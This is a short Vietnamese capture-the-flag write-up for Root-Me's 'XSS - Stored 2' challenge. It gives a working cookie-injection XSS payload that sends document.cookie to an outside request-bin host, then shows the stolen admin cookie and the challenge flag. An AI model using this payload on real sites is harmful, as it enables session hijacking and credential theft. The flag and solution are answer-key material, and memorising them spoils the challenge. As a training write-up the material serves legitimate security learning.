# [XSS - Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2#validation_challenge)

## Solutions

Lần này xuất hiện lỗ hổng ở chỗ cookie, khi mà phía server bê nguyên giá trị của cookie `status` vào giữa cặp dấu `""`:

```html
<i class=""></i>
```

Khai thác:

- tạo một bin request: `https://eoy2rz3omrhb838.m.pipedream.net`
- gửi post request với cookie: `status="></i><script>document.location=%22https://eoy2rz3omrhb838.m.pipedream.net?%22.concat(document.cookie)</script><i class="`
- => response:

```html
<i class=""></i><script>document.location="https://eoy2rz3omrhb838.m.pipedream.net?".concat(document.cookie)</script><i class=""></i>
```

- Đợi một lúc sẽ có request của admin kèm cookie: `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`
- Vào trang admin gửi kèm cookie này đi sẽ lấy được flag: `E5HKEGyCXQVsYaehaqeJs0AfV`

## References
